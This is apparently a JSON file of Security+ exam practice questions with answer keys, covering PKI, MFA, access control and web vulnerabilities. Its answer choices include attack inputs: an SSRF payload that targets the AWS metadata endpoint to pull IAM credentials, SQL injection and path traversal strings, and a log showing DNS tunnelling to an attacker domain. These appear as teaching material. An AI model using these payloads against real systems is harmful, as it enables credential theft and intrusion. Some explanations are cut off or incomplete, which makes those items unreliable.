      "ch": "1",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "medium",
      "cat": "PKI",
      "title": "Match PKI components to their roles",
      "scenario": "",
      "question": "Match each PKI component to its correct function in a certificate infrastructure.",
      "explanation": "Root CA: the trust anchor — kept offline in HSMs. If it signs intermediate CAs only, a compromised intermediate can be revoked without destroying all PKI trust. Intermediate CA: online, signs end-entity certs. CSR: applicant generates key pair locally, sends only the public key in the CSR — private key never leaves the applicant. OCSP: real-time per-certificate check. CRL: batch list, published periodically, can be stale between updates.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Root CA"
        },
        {
          "id": "i1",
          "label": "Intermediate CA"
        },
        {
          "id": "i2",
          "label": "Certificate Signing Request (CSR)"
        },
        {
          "id": "i3",
          "label": "OCSP Responder"
        },
        {
          "id": "i4",
          "label": "Certificate Revocation List (CRL)"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Self-signed trust anchor kept offline — signs only intermediate CA certificates"
        },
        {
          "id": "t1",
          "label": "Online CA that signs end-entity certificates daily — can be revoked by Root CA if compromised"
        },
        {
          "id": "t2",
          "label": "Document containing the applicant's public key and identity, submitted to CA for signing"
        },
        {
          "id": "t3",
          "label": "Real-time certificate status service queried by clients to check if a specific cert is valid"
        },
        {
          "id": "t4",
          "label": "Periodically published list of revoked certificate serial numbers — not real-time"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p053",
      "ch": "1",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "easy",
      "cat": "Authentication",
      "title": "Identify the strongest MFA option for admin accounts",
      "scenario": "An organisation is selecting MFA for 50 privileged administrator accounts that access critical production systems.",
      "question": "Which MFA method provides the STRONGEST protection against phishing and credential relay attacks?",
      "explanation": "FIDO2/WebAuthn is the only phishing-resistant option. Origin binding means the cryptographic challenge/response includes the website domain — a phishing site on attacker.com receives a challenge that only works for attacker.com, not for company.com. The attacker cannot relay it. TOTP, SMS, and email OTPs can all be relayed in real time by a proxy phishing site that immediately forwards the code to the legitimate site before it expires. For privileged accounts, FIDO2 is the gold standard.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. FIDO2 hardware security key (YubiKey) - Public-key cryptography with origin binding. Private key never leaves the device. Cryptographic assertion is domain-specific — a phishing site on a different domain cannot obtain a valid response.\n2. TOTP authenticator app (6-digit code) - Time-based code rotating every 30 seconds. Shared secret on server and device. Codes can be relayed in real-time by a phishing proxy sitting between victim and legitimate site.\n3. SMS OTP sent to registered phone - 6-digit code via text message. Vulnerable to SIM swapping, SS7 interception, and real-time phishing relay. NIST SP 800-63B deprecated SMS as a second factor.\n4. Email OTP to corporate email account - 6-digit code via email. Security depends on email account protection. Weakest option — if email is compromised, MFA is bypassed.",
      "choices": [
        "FIDO2 hardware security key (YubiKey)",
        "TOTP authenticator app (6-digit code)",
        "SMS OTP sent to registered phone",
        "Email OTP to corporate email account"
      ],
      "correct": 0
    },
    {
      "id": "p054",
      "ch": "1",
      "type": "FILL BLANK",
      "emoji": "✏️",
      "difficulty": "hard",
      "cat": "Cryptography",
      "title": "Complete the cryptographic key management terminology",
      "scenario": "",
      "question": "Fill in the correct term for each key management concept.",
      "explanation": "HSM: the gold standard for key protection — used by CAs, banks, and government. Keys generated inside never leave in plaintext. Key wrapping: RSA public key wraps AES session key — recipient uses RSA private key to unwrap. Used in PKCS#7, CMS envelopes, and hybrid encryption. Key derivation (KDF): PBKDF2 applies HMAC thousands of times; bcrypt/Argon2 use memory-hard functions. The salt prevents rainbow tables; the iterations prevent brute-force. All three are heavily tested in Security+.",
      "hint": "Fill each blank with the most accurate security term.",
      "blanks": [
        {
          "id": "b0",
          "sentence": "A ___ is a tamper-resistant hardware device that generates, stores, and performs cryptographic operations with private keys — the keys never exist in plaintext outside the device.",
          "answer": "Hardware Security Module (HSM)",
          "hint": "Key Management Server, Hardware Security Module (HSM), Trusted Platform Module (TPM), Key Escrow System"
        },
        {
          "id": "b1",
          "sentence": "___ is the process of encrypting one key with another key for secure storage or transmission — commonly used to protect symmetric keys by wrapping them with an asymmetric public key.",
          "answer": "Key wrapping",
          "hint": "Key stretching, Key wrapping, Key derivation, Key rotation"
        },
        {
          "id": "b2",
          "sentence": "___ uses a slow, salted hash function (PBKDF2, bcrypt, Argon2) applied many times to derive a cryptographic key from a password — deliberately slow to resist brute-force attacks.",
          "answer": "Key derivation",
          "hint": "Key wrapping, Key escrow, Key derivation, Key rotation"
        }
      ]
    },
    {
      "id": "p055",
      "ch": "1",
      "type": "ORDERING",
      "emoji": "📋",
      "difficulty": "easy",
      "cat": "Security Controls",
      "title": "Order physical security controls by their layer (outermost first)",
      "scenario": "",
      "question": "Order these physical security controls from the OUTERMOST perimeter layer to the INNERMOST (most sensitive area).",
      "explanation": "Physical security follows the defence-in-depth onion model — outermost to innermost: (1) Perimeter fencing + CCTV: building exterior. (2) Security guard lobby: first human checkpoint. (3) Mantrap at data centre entrance: prevents tailgating into the facility. (4) Biometric reader: controls access to the most sensitive room within the facility. (5) Server rack locks: innermost — individual equipment protection. Each layer slows attackers and provides a detection/deterrence opportunity.",
      "hint": "Place the steps in the most secure operational order.",
      "items": [
        {
          "id": "o0",
          "label": "Server rack locks preventing access to individual servers"
        },
        {
          "id": "o1",
          "label": "CCTV and perimeter fencing around the building exterior"
        },
        {
          "id": "o2",
          "label": "Mantrap with badge reader at the data centre entrance"
        },
        {
          "id": "o3",
          "label": "Biometric reader at the secure operations room door"
        },
        {
          "id": "o4",
          "label": "Security guard desk in the building lobby"
        }
      ],
      "correctOrder": [
        "o1",
        "o4",
        "o2",
        "o3",
        "o0"
      ]
    },
    {
      "id": "p056",
      "ch": "1",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "medium",
      "cat": "Security Principles",
      "title": "Match access control models to their defining characteristics",
      "scenario": "",
      "question": "Match each access control model to its DEFINING characteristic.",
      "explanation": "DAC: owners control access — Windows NTFS file permissions are DAC. MAC: system enforces — Bell-LaPadula model (no read up, no write down). RBAC: roles abstract permissions — Engineer role has certain access, not tied to individual. ABAC: policy language evaluates attributes (user clearance level, object sensitivity, time of day, location) — Zero Trust architectures use ABAC. Rule-based: static rules applied by admin — ACLs and time-based restrictions.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "DAC (Discretionary Access Control)"
        },
        {
          "id": "i1",
          "label": "MAC (Mandatory Access Control)"
        },
        {
          "id": "i2",
          "label": "RBAC (Role-Based Access Control)"
        },
        {
          "id": "i3",
          "label": "ABAC (Attribute-Based Access Control)"
        },
        {
          "id": "i4",
          "label": "Rule-Based Access Control"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Resource OWNER decides who can access — most flexible, least secure (e.g., standard file system permissions)"
        },
        {
          "id": "t1",
          "label": "Operating system enforces access based on classification labels — users cannot override (e.g., military systems, SELinux)"
        },
        {
          "id": "t2",
          "label": "Permissions assigned to ROLES, users assigned to roles — most common enterprise IAM model"
        },
        {
          "id": "t3",
          "label": "Access decisions based on subject, object, and environment attributes evaluated against policies — most flexible model"
        },
        {
          "id": "t4",
          "label": "Access controlled by administrator-defined rules (e.g., firewall ACLs, time-of-day restrictions)"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p057",
      "ch": "1",
      "type": "TERMINAL SIM",
      "emoji": "💻",
      "difficulty": "hard",
      "cat": "Cryptography",
      "title": "Verify digital signature integrity with GPG",
      "scenario": "A security engineer receives a software package with a detached GPG signature. They need to verify the package authenticity before deployment.",
      "question": "Select the correct GPG command to verify the detached signature \"package.tar.gz.sig\" against \"package.tar.gz\" after importing the vendor's public key.",
      "explanation": "gpg --verify signature_file data_file verifies a detached signature. The workflow: (1) Import vendor public key (done). (2) Verify: GPG uses the public key to verify the signature — confirming both the package is unmodified (integrity) and it was signed by the vendor's private key (authenticity/non-repudiation). Critical: always verify the key fingerprint via a second channel (vendor website, phone) — importing a wrong public key defeats the purpose.",
      "hint": "Select the command that produces the secure result requested by the prompt.",
      "answer": "engineer@server:~$ # Files received:\n# package.tar.gz (software package)\n# package.tar.gz.sig (detached signature)\n# vendor-pubkey.asc (vendor public key)\nengineer@server:~$ gpg --import vendor-pubkey.asc\ngpg: key ABC12345: public key \"Vendor Corp \" imported\n\ngpg: Signature made Mon 15 Apr 2024 09:00:00 UTC\ngpg:                using RSA key ABC12345\ngpg: Good signature from \"Vendor Corp \" [full]\nPrimary key fingerprint: ABCD 1234 EFGH 5678 IJKL  9012 MNOP 3456\n[VERIFIED] Package integrity and authenticity confirmed\n[NOTE] Always verify fingerprint out-of-band with vendor website",
      "choices": [
        "gpg --verify package.tar.gz.sig package.tar.gz",
        "gpg --encrypt --recipient security@vendor.com package.tar.gz",
        "gpg --sign package.tar.gz",
        "gpg --decrypt package.tar.gz > output.tar.gz"
      ],
      "correct": 0
    },
    {
      "id": "p058",
      "ch": "1",
      "type": "CONFIG/ACL",
      "emoji": "⚙️",
      "difficulty": "medium",
      "cat": "Authentication",
      "title": "Evaluate an Active Directory password policy against NIST SP 800-63B",
      "scenario": "Review an Active Directory password policy and determine if each setting aligns with NIST SP 800-63B current guidance.",
      "question": "12 character minimum — meets NIST guidance?",
      "explanation": "NIST SP 800-63B (2017, updated 2024) reversed traditional guidance: 90-day rotation: DEPRECATED — causes predictable patterns (Password1→Password2). Change only on evidence of compromise. Complexity rules: DEPRECATED — creates weak patterns (P@ssw0rd!). Focus on length instead. Breach screening: STRONGLY RECOMMENDED — block passwords in known breach lists (HaveIBeenPwned API). Security questions: DEPRECATED — answers are guessable or findable on social media. Use out-of-band verification instead. 12-char minimum: NIST recommends at least 8, but 12+ is best practice.",
      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
      "currentConfig": "Setting | Configured Value | NIST 800-63B Aligned?\n1. Minimum password length | 12 characters minimum | Length | ?\n2. Mandatory 90-day expiry | Force change every 90 days | Rotation | ?\n3. Complexity rules | Must include uppercase, number, symbol | Complexity | ?\n4. Breach password screening | New passwords checked against known breach list | Screening | ?\n5. Password hints | Security questions allowed as account recovery | Recovery | ?",
      "choices": [
        "COMPLIANT",
        "NON-COMPLIANT"
      ],
      "correct": 0
    },
    {
      "id": "p059",
      "ch": "1",
      "type": "LOG ANALYSIS",
      "emoji": "📊",
      "difficulty": "hard",
      "cat": "PKI",
      "title": "Identify the certificate chain issue from TLS scan output",
      "scenario": "A security scanner reports TLS configuration details for a payment portal.",
      "question": "Which finding is supported by the log data?",
      "explanation": "Two issues identified: (1) Incomplete chain: the server is only sending its own certificate, not the intermediate CA. Fix: concatenate the server cert and intermediate CA cert in the certificate file (e.g., Apache SSLCertificateChainFile or Nginx ssl_certificate with full chain). Clients that haven't cached the intermediate will see warnings. (2) OCSP Stapling not configured: without stapling, clients must contact the CA's OCSP server directly — slower, adds latency, and reveals browsing behaviour to the CA. TLS 1.3 is correct (do not downgrade). 5-year certs are non-compliant with CA/Browser Forum rules (max 1 year).",
      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
      "logData": "TLS Scan Results — payments.company.com\n====================================\nProtocol: TLSv1.3\nCipher: TLS_AES_256_GCM_SHA384\n\nCertificate chain:\n  [0] payments.company.com\n      Issuer: Intermediate CA — Company Corp\n      Valid: 2024-01-01 to 2025-01-01\n      SAN: payments.company.com, www.payments.company.com\n\n  [1] Missing — server is not sending intermediate CA certificate\n\nChain validation: FAIL — unable to verify issuer certificate\nBrowser behaviour: Warning shown to users without cached intermediate\n\nHTSP header: present (max-age=31536000)\nOCSP Stapling: not configured",
      "choices": [
        "Configure the web server to send the full certificate chain (server cert + intermediate CA cert concatenated) to fix the incomplete chain",
        "Enable OCSP Stapling so the server periodically fetches and caches the OCSP response, including it in the TLS handshake for better revocation performance and privacy",
        "Upgrade from TLS 1.3 to TLS 1.2 — TLS 1.2 handles incomplete chains better",
        "Extend the certificate validity period to 5 years to reduce renewal overhead"
      ],
      "correct": 0
    },
    {
      "id": "p060",
      "ch": "1",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "medium",
      "cat": "Security Controls",
      "title": "Identify the correct control type for each scenario",
      "scenario": "A security architect reviews four planned controls. Identify which control is MISCLASSIFIED.",
      "question": "Which control is INCORRECTLY classified by the architect?",
      "explanation": "Restoring from backup after ransomware is a CORRECTIVE control, not preventive. Backups do not prevent the ransomware attack — they correct/recover from it after it occurs. Having backups does not stop the encryption from happening. Preventive controls stop incidents (firewall, encryption, access controls). Detective controls identify incidents (IDS, SIEM, audit logs). Corrective controls restore to a known good state after an incident (restore from backup, re-imaging, patching after exploitation). Compensating controls substitute for another control that cannot be applied.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. Firewall blocking inbound Telnet (port 23) → classified as Preventive - Correct — the firewall actively blocks the connection before it occurs. Preventive controls stop incidents from happening.\n2. IDS alerting on port scan activity → classified as Detective - Correct — the IDS identifies and reports suspicious activity. Detective controls discover incidents that have occurred or are in progress.\n3. Restoring encrypted files from backup after ransomware → classified as Preventive - The architect says: \"Backups prevent data loss, so they are preventive controls.\"\n4. Encrypting sensitive data at rest → classified as Preventive - Correct — encryption prevents unauthorised users from reading data even if they gain physical access. Preventive control.",
      "choices": [
        "Firewall blocking inbound Telnet (port 23) → classified as Preventive",
        "IDS alerting on port scan activity → classified as Detective",
        "Restoring encrypted files from backup after ransomware → classified as Preventive",
        "Encrypting sensitive data at rest → classified as Preventive"
      ],
      "correct": 2
    },
    {
      "id": "p061",
      "ch": "2",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "easy",
      "cat": "Social Engineering",
      "title": "Match social engineering techniques to their delivery method",
      "scenario": "",
      "question": "Match each social engineering technique to its PRIMARY delivery method.",
      "explanation": "Phishing: bulk email. Vishing: voice/phone. Smishing: SMS. Spear phishing: targeted email using OSINT (LinkedIn research, public records). Watering hole: attacker compromises a legitimate industry website (trade publication, supplier portal) knowing the target group visits it — malware delivered automatically on visit. Watering holes are passive (victim comes to the attacker) unlike phishing (attacker goes to victim). APTs commonly use watering holes to target specific industries.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Phishing"
        },
        {
          "id": "i1",
          "label": "Vishing"
        },
        {
          "id": "i2",
          "label": "Smishing"
        },
        {
          "id": "i3",
          "label": "Spear phishing"
        },
        {
          "id": "i4",
          "label": "Watering hole attack"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Mass fraudulent email impersonating trusted entity — sent to large recipient lists"
        },
        {
          "id": "t1",
          "label": "Voice call impersonating IT support, bank, or authority figure to extract information"
        },
        {
          "id": "t2",
          "label": "SMS text message containing malicious link or urgent request"
        },
        {
          "id": "t3",
          "label": "Highly targeted email personalised with OSINT about the specific victim and their contacts"
        },
        {
          "id": "t4",
          "label": "Compromising a legitimate website frequented by the target group — infects visitors silently"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p062",
      "ch": "2",
      "type": "TERMINAL SIM",
      "emoji": "💻",
      "difficulty": "medium",
      "cat": "Vulnerability Types",
      "title": "Identify and test for SSRF vulnerability",
      "scenario": "A bug bounty hunter is testing a web application that fetches metadata for URLs submitted by users.",
      "question": "Which request BEST demonstrates a Server-Side Request Forgery (SSRF) attack against an AWS EC2 instance?",
      "explanation": "SSRF against AWS IMDS (169.254.169.254) is one of the most impactful cloud vulnerabilities. The application fetches the URL server-side — the attacker redirects it to the instance metadata service which returns temporary IAM credentials. IMDSv2 mitigation: requires a PUT request to create a session token before GET requests — simple HTTP GET SSRF attacks are blocked. Application-level mitigations: validate/allowlist URLs, block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x), and disable URL schemes except https.",
      "hint": "Select the command that produces the secure result requested by the prompt.",
      "answer": "Target: https://app.company.com/api/fetch-preview\nFunction: Fetches URL metadata (title, description) for link previews\nPOST /api/fetch-preview HTTP/1.1\nContent-Type: application/json\n{\"url\": \"https://example.com\"}  ← normal usage\n\nHTTP/1.1 200 OK\n{\n  \"metadata\": {\n    \"AWS_ACCESS_KEY_ID\": \"ASIA1234567890ABCDEF\",\n    \"AWS_SECRET_ACCESS_KEY\": \"abc123def456...\",\n    \"AWS_SESSION_TOKEN\": \"IQoJb3JpZ2l...\",\n    \"Expiration\": \"2024-04-01T06:14:12Z\"\n  }\n}\n[CRITICAL] Temporary IAM credentials exposed!\n[IMPACT] Attacker has EC2 instance role permissions\n[MITIGATIONS]\n  → Enforce IMDSv2 (session-oriented — blocks simple SSRF)\n  → Block 169.254.169.254 in application-level egress\n  → Implement SSRF-safe URL validation (allowlist, block private IPs)",
      "choices": [
        "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
        "{\"url\": \"javascript:alert(document.cookie)\"}",
        "{\"url\": \"https://example.com/' OR 1=1 --\"}",
        "{\"url\": \"file:///etc/passwd\"}"
      ],
      "correct": 0
    },
    {
      "id": "p063",
      "ch": "2",
      "type": "LOG ANALYSIS",
      "emoji": "📊",
      "difficulty": "hard",
      "cat": "Threats",
      "title": "Analyse process tree for process injection indicators",
      "scenario": "An EDR captures the following process tree on a compromised endpoint at 03:22 AM.",
      "question": "Which finding is supported by the log data?",
      "explanation": "PID 3801: Legitimate svchost.exe ONLY runs from C:\\Windows\\System32\\. A svchost.exe in C:\\Users\\Public\\ is a malicious binary masquerading as a Windows process (T1036 — Masquerading) + the 128MB/s outbound to a known TOR-adjacent IP confirms active C2/exfiltration. PID 4910: notepad.exe spawned from powershell.exe is anomalous (notepad is a text editor, should be launched by a user double-clicking a file) — suggests process hollowing (legitimate notepad process hollowed out and replaced with malicious code) or code injection into notepad. Both are T1055 (Process Injection) indicators.",
      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
      "logData": "PROCESS TREE — WORKSTATION-14 — 2024-04-01 03:22:07\n==============================================\nPID  PPID Name                  Path\n4    0    System\n628  4    smss.exe              C:\\Windows\\System32\\smss.exe\n700  628  csrss.exe             C:\\Windows\\System32\\csrss.exe\n760  628  wininit.exe           C:\\Windows\\System32\\wininit.exe\n  820  760  services.exe        C:\\Windows\\System32\\services.exe\n    1240 820  svchost.exe       C:\\Windows\\System32\\svchost.exe\n    3801 820  svchost.exe       C:\\Users\\Public\\svchost.exe    [!]\n  880  760  lsass.exe           C:\\Windows\\System32\\lsass.exe\n2900 2440 explorer.exe          C:\\Windows\\System32\\explorer.exe\n  4501 2900 chrome.exe          C:\\Program Files\\Google\\Chrome\\chrome.exe\n  4892 2900 cmd.exe             C:\\Windows\\System32\\cmd.exe\n    4900 4892 powershell.exe    C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n      4910 4900 notepad.exe     C:\\Windows\\System32\\notepad.exe  [!]\nNET CONNECTIONS PID 3801: OUT 185.220.101.45:443 128MB/s",
      "choices": [
        "PID 3801: svchost.exe running from C:\\Users\\Public\\ (not System32) with PPID=820 (services.exe) — path masquerading; confirmed C2 by 128MB/s outbound to 185.220.101.45",
        "PID 4910: notepad.exe spawned from powershell.exe — notepad should never be launched from PowerShell and has no network function; indicates process hollowing or injection",
        "PID 4892: cmd.exe spawned from explorer.exe — normal user activity",
        "PID 4501: chrome.exe — normal browser process"
      ],
      "correct": 0
    },
    {
      "id": "p064",
      "ch": "2",
      "type": "ORDERING",
      "emoji": "📋",
      "difficulty": "medium",
      "cat": "Mitigation",
      "title": "Order the steps to implement a vulnerability management programme",
      "scenario": "",
      "question": "Order these vulnerability management programme implementation steps from FIRST to LAST.",
      "explanation": "VM programme order: (1) Asset inventory — scope starts with knowing what you have. (2) Define scope and cadence — what gets scanned, how often. (3) Risk-rate findings — not all CVEs are equal; context matters. (4) Remediate in priority order — fix the most dangerous first with SLA enforcement. (5) Verify — rescan to confirm the fix worked. Skipping verification is common and results in false confidence. The cycle then repeats continuously. CISA KEV and EPSS scores should supplement CVSS in the risk-rating step.",
      "hint": "Place the steps in the most secure operational order.",
      "items": [
        {
          "id": "o0",
          "label": "Define scope, assets, and establish a vulnerability scanning cadence (daily, weekly, monthly by criticality)"
        },
        {
          "id": "o1",
          "label": "Establish asset inventory — you cannot manage vulnerabilities in systems you don't know exist"
        },
        {
          "id": "o2",
          "label": "Remediate findings in priority order based on risk rating, with defined SLAs per severity level"
        },
        {
          "id": "o3",
          "label": "Risk-rate all findings using CVSS + exploitability context + business criticality + exposure"
        },
        {
          "id": "o4",
          "label": "Verify remediation effectiveness by rescanning and manually confirming fixes"
        }
      ],
      "correctOrder": [
        "o1",
        "o0",
        "o3",
        "o2",
        "o4"
      ]
    },
    {
      "id": "p065",
      "ch": "2",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "hard",
      "cat": "Vulnerability Types",
      "title": "Match OWASP vulnerability types to their root cause",
      "scenario": "",
      "question": "Match each OWASP Top 10 category to the ROOT CAUSE that creates the vulnerability.",
      "explanation": "Root causes: Injection: no separation between code and data — fix with parameterised queries. Broken Access Control: missing authorisation checks — fix with server-side enforcement on every request. Security Misconfiguration: defaults not changed, features enabled unnecessarily — fix with hardening standards and automated configuration checks. Cryptographic Failures: weak algorithms (MD5, SHA-1), plaintext storage, missing TLS — fix with current algorithm standards. Insecure Design: the deepest problem — no amount of implementation hardening fixes a fundamentally insecure design; requires threat modelling during design phase.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Injection (A03)"
        },
        {
          "id": "i1",
          "label": "Broken Access Control (A01)"
        },
        {
          "id": "i2",
          "label": "Security Misconfiguration (A05)"
        },
        {
          "id": "i3",
          "label": "Cryptographic Failures (A02)"
        },
        {
          "id": "i4",
          "label": "Insecure Design (A04)"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "User-supplied data is interpreted as code or commands by an interpreter due to lack of parameterisation"
        },
        {
          "id": "t1",
          "label": "Insufficient server-side authorisation checks allow users to access resources beyond their intended permissions"
        },
        {
          "id": "t2",
          "label": "Insecure defaults, unnecessary features enabled, or missing security hardening in the configuration"
        },
        {
          "id": "t3",
          "label": "Sensitive data exposed due to weak algorithms, improper key management, or missing encryption"
        },
        {
          "id": "t4",
          "label": "Security requirements not defined in the design phase — vulnerabilities built into architecture before code is written"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p066",
      "ch": "2",
      "type": "HOTSPOT",
      "emoji": "📍",
      "difficulty": "medium",
      "cat": "Indicators of Compromise",
      "title": "Identify the C2 communication pattern",
      "scenario": "A threat hunter analyses proxy logs for WORKSTATION-07 over 72 hours.",
      "question": "Which traffic pattern is the STRONGEST indicator of Command & Control beaconing?",
      "explanation": "Machine-precise beaconing (298-302s ±2s) while the user is on holiday is the highest-confidence C2 indicator. Key IOCs: (1) Jitter: the ±2 second variation is characteristic of programmatic beaconing (not human). (2) 24/7 continuity: humans don't work continuously — automated malware does. (3) User was on holiday: eliminates any legitimate user-initiated explanation. (4) Consistent small packet size = heartbeat. DNS tunneling (option C) is also serious but the beaconing pattern has more confirmatory context. Dropbox upload may be legitimate. Business-hours traffic is normal.",
      "hint": "Choose the hotspot label that best answers the prompt.",
      "diagram": "1. Connections to 185.220.x.x every 298-302 seconds ±2s, 24/7 including weekends, 180-220 bytes per connection - Perfect regular interval with minor jitter — 864 connections over 72 hours. Source: WORKSTATION-07. User was on holiday for the entire 72-hour period.\n2. Connections to Microsoft 365, Google, and Slack during business hours - Traffic correlates with business hours and user activity patterns. Normal enterprise cloud usage.\n3. DNS TXT queries with Base64-encoded subdomains to data.attacker.com - Queries like aGVsbG8=.data.attacker.com — 2.1MB of DNS data over 72 hours. Highly suspicious but separate indicator.\n4. Single 4GB HTTPS upload to Dropbox on Friday at 17:30 - Large upload correlating with end of work week. Could be a legitimate file sync or data exfiltration.",
      "choices": [
        "Connections to 185.220.x.x every 298-302 seconds ±2s, 24/7 including weekends, 180-220 bytes per connection",
        "Connections to Microsoft 365, Google, and Slack during business hours",
        "DNS TXT queries with Base64-encoded subdomains to data.attacker.com",
        "Single 4GB HTTPS upload to Dropbox on Friday at 17:30"
      ],
      "correct": 0
    },
    {
      "id": "p067",
      "ch": "2",
      "type": "FILL BLANK",
      "emoji": "✏️",
      "difficulty": "easy",
      "cat": "Mitigation",
      "title": "Complete the email security protocol descriptions",
      "scenario": "",
      "question": "Fill in the correct email security protocol for each description.",
      "explanation": "SPF: DNS TXT record listing authorised sending IPs — receiving server checks if the sending IP is in the list. DKIM: private key signs email headers — receiving server looks up public key in DNS to verify signature. Confirms identity AND integrity. DMARC: policy enforcement layer — specifies what to do when SPF/DKIM fail (none/quarantine/reject). Also enables aggregate reporting (rua=) so domain owners see who is sending on their behalf. Correct deployment order: SPF → DKIM → DMARC p=none (monitor) → DMARC p=quarantine → DMARC p=reject.",
      "hint": "Fill each blank with the most accurate security term.",
      "blanks": [
        {
          "id": "b0",
          "sentence": "___ is a DNS TXT record that specifies which mail servers are authorised to send email on behalf of a domain — receiving servers check this to detect spoofed senders.",
          "answer": "SPF",
          "hint": "DKIM, DMARC, SPF, S/MIME"
        },
        {
          "id": "b1",
          "sentence": "___ adds a cryptographic signature to email headers using a private key, allowing receiving servers to verify the email was genuinely sent by the stated domain and was not modified in transit.",
          "answer": "DKIM",
          "hint": "SPF, DMARC, DKIM, TLS"
        },
        {
          "id": "b2",
          "sentence": "___ builds on SPF and DKIM, allowing domain owners to specify what receiving servers should do with emails that fail those checks — none (monitor), quarantine (spam), or reject (block).",
          "answer": "DMARC",
          "hint": "SPF, DKIM, DMARC, BIMI"
        }
      ]
    },
    {
      "id": "p068",
      "ch": "2",
      "type": "TERMINAL SIM",
      "emoji": "💻",
      "difficulty": "hard",
      "cat": "Vulnerability Types",
      "title": "Exploit and remediate a stored XSS vulnerability",
      "scenario": "A penetration tester is testing a comment field on a product review page. Other users' browsers render these comments.",
      "question": "Which payload would confirm a Stored XSS vulnerability, and which RESPONSE header would be the MOST effective mitigation?",
      "explanation": "Stored XSS persists in the database and executes for every user who views the page. The img onerror payload is XSS without a script tag — bypasses naive script-tag filters. CSP (Content-Security-Policy) is the most effective defensive header — restricting script-src prevents the fetch() from executing even if XSS is injected. However, the ROOT CAUSE fix is output encoding (converting HttpOnly cookies prevent JavaScript cookie theft even if XSS executes.",
      "hint": "Select the command that produces the secure result requested by the prompt.",
      "answer": "POST /api/reviews HTTP/1.1\nContent-Type: application/json\n{\"product_id\": 42, \"comment\": \"___PAYLOAD___\"}\n\nGoal: Confirm stored XSS AND identify the best preventive header\n\n[XSS CONFIRMED] Comment stored and rendered:\n\nBrowser executes fetch() → sends session cookies to attacker\nAll users viewing this product page are affected\n\n[MITIGATIONS]\n1. Output encoding: htmlspecialchars() all stored content before rendering\n2. Content-Security-Policy: script-src 'self'; prevents external fetch()\n3. HttpOnly cookie flag: prevents JavaScript cookie access entirely\n4. Input validation: reject HTML tags in review fields",
      "choices": [
        "Payload:  | Header: Content-Security-Policy: script-src 'self'; img-src 'self'",
        "Payload: 1' OR 1=1 -- | Header: X-Frame-Options: DENY",
        "Payload: ../../../etc/passwd | Header: Strict-Transport-Security: max-age=31536000",
        "Payload: bold text | Header: X-Content-Type-Options: nosniff"
      ],
      "correct": 0
    },
    {
      "id": "p069",
      "ch": "2",
      "type": "DRAG & DROP",
      "emoji": "🔀",
      "difficulty": "medium",
      "cat": "Threat Actors",
      "title": "Match attack motivations to threat actor types",
      "scenario": "",
      "question": "Match each primary motivation to the threat actor type MOST commonly associated with it.",
      "explanation": "Cybercriminal groups: profit-motivated — RaaS, BEC, card fraud. Nation-state/APT: geopolitical — long dwell time, custom tooling, intelligence collection, infrastructure attacks. Hacktivists: ideological — DDoS, defacement, data leaks to embarrass. Malicious insider: personal — disgruntled employee, financial pressure, coercion; uniquely dangerous because they have legitimate access that bypasses perimeter controls. Script kiddies: no custom capability — use Metasploit, public exploits, YouTube tutorials; opportunistic targets only.",
      "hint": "Drag each item to the target it best matches.",
      "items": [
        {
          "id": "i0",
          "label": "Financial gain through ransomware and payment fraud"
        },
        {
          "id": "i1",
          "label": "Geopolitical espionage and long-term infrastructure access"
        },
        {
          "id": "i2",
          "label": "Ideological or political protest through disruption"
        },
        {
          "id": "i3",
          "label": "Personal grievance or coercion with insider access"
        },
        {
          "id": "i4",
          "label": "Fame, curiosity, or peer recognition with low-skill attacks"
        }
      ],
      "targets": [
        {
          "id": "t0",
          "label": "Organised cybercriminal groups (e.g., RaaS affiliates, banking trojans)"
        },
        {
          "id": "t1",
          "label": "Nation-state / APT actors (e.g., APT28, APT29, Lazarus Group)"
        },
        {
          "id": "t2",
          "label": "Hacktivists (e.g., Anonymous, political hacking groups)"
        },
        {
          "id": "t3",
          "label": "Malicious insider (current or former employee with authorised access)"
        },
        {
          "id": "t4",
          "label": "Script kiddies (low technical skill, use existing tools and tutorials)"
        }
      ],
      "correctMapping": {
        "i0": "t0",
        "i1": "t1",
        "i2": "t2",
        "i3": "t3",
        "i4": "t4"
      }
    },
    {
      "id": "p070",
      "ch": "2",
      "type": "CONFIG/ACL",
      "emoji": "⚙️",
      "difficulty": "medium",
      "cat": "Mitigation",
      "title": "Configure Windows Defender Firewall rules for a workstation",
      "scenario": "A Windows 10 workstation in a corporate domain needs firewall rules. Requirements: allow RDP only from IT admin subnet (10.10.0.0/24), allow all outbound, block inbound everything else.",
